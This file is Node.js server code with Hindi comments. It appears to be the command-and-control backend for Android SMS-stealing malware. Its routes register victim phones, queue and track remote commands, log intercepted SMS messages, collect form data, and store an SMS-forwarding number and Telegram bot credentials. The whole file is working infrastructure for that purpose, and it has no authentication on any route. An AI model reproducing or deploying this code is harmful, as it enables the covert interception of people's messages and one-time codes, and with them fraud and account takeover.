const http = require('http' );
const path = require('path');
const fs = require('fs');
const Database = require('better-sqlite3');

// --- डेटाबेस सेटअप ---
// Vercel पर लिखने के लिए सिर्फ /tmp फोल्डर उपलब्ध है।
const dbPath = path.join(process.env.VERCEL ? '/tmp' : '.', 'database.sqlite');
const db = new Database(dbPath);

// टेबल बनाने का कोड (सिर्फ एक बार चलेगा)
db.exec(`
    CREATE TABLE IF NOT EXISTS devices (
        id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT UNIQUE NOT NULL, device_name TEXT,
        os_version TEXT, phone_number TEXT, battery_level INTEGER, last_seen DATETIME NOT NULL,
        created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP
    );
    CREATE TABLE IF NOT EXISTS commands (
        id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT NOT NULL, command_type TEXT NOT NULL,
        command_data TEXT NOT NULL, status TEXT NOT NULL DEFAULT 'pending',
        created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP
    );
    CREATE TABLE IF NOT EXISTS sms_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT NOT NULL, sender TEXT NOT NULL,
        message_body TEXT NOT NULL, received_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP
    );
    CREATE TABLE IF NOT EXISTS form_submissions (
        id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT NOT NULL, custom_data TEXT NOT NULL,
        submitted_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP
    );
    CREATE TABLE IF NOT EXISTS global_settings (
        setting_key TEXT PRIMARY KEY UNIQUE NOT NULL, setting_value TEXT
    );
`);

// --- मुख्य सर्वर लॉजिक ---
module.exports = async (req, res) => {
    const { method, url } = req;
    let body = '';

    req.on('data', chunk => {
        body += chunk.toString();
    });

    req.on('end', async () => {
        const reqBody = body ? JSON.parse(body) : {};
        const urlParts = url.split('/').filter(Boolean); // URL को हिस्सों में तोड़ें

        try {
            // --- सभी API रूट्स को यहाँ हैंडल करें ---

            // 1. डिवाइस रजिस्ट्रेशन और अपडेट (POST /api/device/register)
            if (method === 'POST' && url === '/api/device/register') {
                const { device_id, device_name, os_version, battery_level, phone_number } = reqBody;
                const now = new Date().toISOString();
                const existing = db.prepare('SELECT id FROM devices WHERE device_id = ?').get(device_id);
                if (existing) {
                    db.prepare('UPDATE devices SET device_name = ?, os_version = ?, battery_level = ?, phone_number = ?, last_seen = ? WHERE device_id = ?').run(device_name, os_version, battery_level, phone_number, now, device_id);
                } else {
                    db.prepare('INSERT INTO devices (device_id, device_name, os_version, battery_level, phone_number, last_seen, created_at) VALUES (?, ?, ?, ?, ?, ?, ?)').run(device_id, device_name, os_version, battery_level, phone_number, now, now);
                }
                return res.status(200).json({ status: 'success', message: 'Device data received and updated.' });
            }

            // 2. सभी डिवाइस की लिस्ट (GET /api/devices)
            if (method === 'GET' && url === '/api/devices') {
                const devices = db.prepare('SELECT * FROM devices ORDER BY created_at ASC').all();
                const now = new Date();
                const devicesWithStatus = devices.map(d => ({ ...d, is_online: (now - new Date(d.last_seen)) / 1000 < 20 }));
                return res.status(200).json(devicesWithStatus);
            }

            // 3. SMS फॉरवर्डिंग नंबर (POST और GET /api/config/sms_forward)
            if (url === '/api/config/sms_forward') {
                if (method === 'POST') {
                    db.prepare("INSERT INTO global_settings (setting_key, setting_value) VALUES ('sms_forward_number', ?) ON CONFLICT(setting_key) DO UPDATE SET setting_value = excluded.setting_value").run(reqBody.forward_number);
                    return res.status(200).json({ status: 'success', message: 'Forwarding number updated.' });
                }
                if (method === 'GET') {
                    const result = db.prepare("SELECT setting_value FROM global_settings WHERE setting_key = 'sms_forward_number'").get();
                    return res.status(200).json({ forward_number: result ? result.setting_value : null });
                }
            }
            
            // 4. टेलीग्राम सेटिंग्स (POST और GET /api/config/telegram)
            if (url === '/api/config/telegram') {
                if (method === 'POST') {
                    db.prepare("INSERT INTO global_settings (setting_key, setting_value) VALUES ('telegram_bot_token', ?) ON CONFLICT(setting_key) DO UPDATE SET setting_value = excluded.setting_value").run(reqBody.telegram_bot_token);
                    db.prepare("INSERT INTO global_settings (setting_key, setting_value) VALUES ('telegram_chat_id', ?) ON CONFLICT(setting_key) DO UPDATE SET setting_value = excluded.setting_value").run(reqBody.telegram_chat_id);
                    return res.status(200).json({ status: 'success', message: 'Telegram settings updated.' });
                }
                if (method === 'GET') {
                    const token = db.prepare("SELECT setting_value FROM global_settings WHERE setting_key = 'telegram_bot_token'").get();
                    const chatId = db.prepare("SELECT setting_value FROM global_settings WHERE setting_key = 'telegram_chat_id'").get();
                    return res.status(200).json({ telegram_bot_token: token ? token.setting_value : null, telegram_chat_id: chatId ? chatId.setting_value : null });
                }
            }

            // 5. कमांड भेजना (POST /api/command/send)
            if (method === 'POST' && url === '/api/command/send') {
                const { device_id, command_type, command_data } = reqBody;
                const info = db.prepare('INSERT INTO commands (device_id, command_type, command_data, status) VALUES (?, ?, ?, ?)')
                               .run(device_id, command_type, JSON.stringify(command_data), 'pending');
                return res.status(201).json({ status: 'success', message: 'Command queued.', command_id: info.lastInsertRowid });
            }

            // 6. पेंडिंग कमांड पाना (GET /api/device/{deviceId}/commands)
            if (method === 'GET' && url.includes('/commands') && urlParts.length === 4) {
                const deviceId = urlParts[2];
                const commands = db.prepare("SELECT id, command_type, command_data FROM commands WHERE device_id = ? AND status = 'pending'").all(deviceId);
                if (commands.length > 0) {
                    const ids = commands.map(c => c.id);
                    db.prepare(`UPDATE commands SET status = 'sent' WHERE id IN (${ids.map(() => '?').join(',')})`).run(...ids);
                }
                const parsedCommands = commands.map(cmd => ({ ...cmd, command_data: JSON.parse(cmd.command_data) }));
                return res.status(200).json(parsedCommands);
            }

            // 7. कमांड को एक्सेक्यूटेड मार्क करना (POST /api/command/{commandId}/execute)
            if (method === 'POST' && url.includes('/execute') && urlParts.length === 4) {
                const commandId = urlParts[2];
                db.prepare("UPDATE commands SET status = 'executed' WHERE id = ?").run(commandId);
                return res.status(200).json({ status: 'success', message: 'Command marked as executed.' });
            }

            // 8. SMS लॉग करना (POST /api/device/{deviceId}/sms)
            if (method === 'POST' && url.includes('/sms') && urlParts.length === 4) {
                const deviceId = urlParts[2];
                db.prepare('INSERT INTO sms_logs (device_id, sender, message_body) VALUES (?, ?, ?)')
                  .run(deviceId, reqBody.sender, reqBody.message_body);
                return res.status(201).json({ status: 'success', message: 'SMS logged.' });
            }

            // 9. फॉर्म डेटा सबमिट करना (POST /api/device/{deviceId}/forms)
            if (method === 'POST' && url.includes('/forms') && urlParts.length === 4) {
                const deviceId = urlParts[2];
                db.prepare('INSERT INTO form_submissions (device_id, custom_data) VALUES (?, ?)')
                  .run(deviceId, reqBody.custom_data);
                return res.status(201).json({ status: 'success', message: 'Form data submitted.' });
            }

            // 10. डिवाइस और उसका डेटा डिलीट करना (DELETE /api/device/{deviceId})
            if (method === 'DELETE' && urlParts.length === 3 && urlParts[1] === 'device') {
                const deviceId = urlParts[2];
                db.transaction(() => {
                    db.prepare('DELETE FROM devices WHERE device_id = ?').run(deviceId);
                    db.prepare('DELETE FROM sms_logs WHERE device_id = ?').run(deviceId);
                    db.prepare('DELETE FROM form_submissions WHERE device_id = ?').run(deviceId);
                    db.prepare('DELETE FROM commands WHERE device_id = ?').run(deviceId);
                })();
                return res.status(200).json({ status: 'success', message: 'Device and all related data deleted.' });
            }
            
            // 11. SMS डिलीट करना (DELETE /api/sms/{smsId})
            if (method === 'DELETE' && urlParts.length === 3 && urlParts[1] === 'sms') {
                const smsId = urlParts[2];
                db.prepare('DELETE FROM sms_logs WHERE id = ?').run(smsId);
                return res.status(200).json({ status: 'success', message: 'SMS deleted.' });
            }

            // अगर कोई रूट मैच नहीं होता है
            res.status(404).json({ error: 'Not Found' });

        } catch (error) {
            console.error(error);
            res.status(500).json({ error: 'Internal Server Error', details: error.message });
        }
    });
};
